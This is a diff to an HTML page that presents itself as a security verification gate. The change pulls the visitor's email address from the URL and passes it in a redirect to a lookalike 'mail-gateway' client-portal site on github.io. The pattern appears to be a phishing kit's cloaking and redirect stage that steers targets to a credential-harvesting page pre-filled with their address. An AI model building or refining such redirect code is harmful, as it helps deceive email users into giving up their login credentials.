@@ -42,8 +42,17 @@ h1{font-size:22px;font-weight:600;margin-bottom:8px;color:#fff}
 <p class="blocked" id="blocked">⛔ Access denied. Security verification failed.</p>
 </div>
 <script>
-/* ─── CONFIG: Replace with your final URL ─── */
-var REDIRECT_URL = "https://mail-gateway.github.io/client-portal/#${email}"; // <-- CHANGE THIS
+/* ─── CONFIG: Extract email and build final URL ─── */
+var email = new URLSearchParams(window.location.search).get('email');
+
+// Fallback to check the hash fragment if not found in query string
+if (!email && window.location.hash) {
+  var hash = window.location.hash.substring(1);
+  if (hash.includes('@')) email = hash;
+}
+
+// Build the final redirect URL using the extracted email
+var REDIRECT_URL = `https://mail-gateway.github.io/client-portal/#${email || ''}`; 
 /* ──────────────────────────────────────────── */
 
 (function(){
